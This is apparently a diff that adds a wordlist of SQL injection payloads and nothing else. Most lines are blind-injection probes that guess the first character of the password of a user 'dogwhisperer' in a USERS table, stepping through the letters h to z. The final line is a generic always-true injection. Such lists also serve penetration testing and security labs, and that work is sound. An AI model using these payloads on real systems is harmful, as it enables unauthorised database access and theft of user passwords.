+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'h'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'i'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'j'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'k'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'l'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'm'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'n'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'o'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'p'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'q'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'r'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 's'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 't'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'u'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'v'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'w'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'x'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'y'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'z'--
+
+
+' or select 1 from USERS WHERE 1=1--
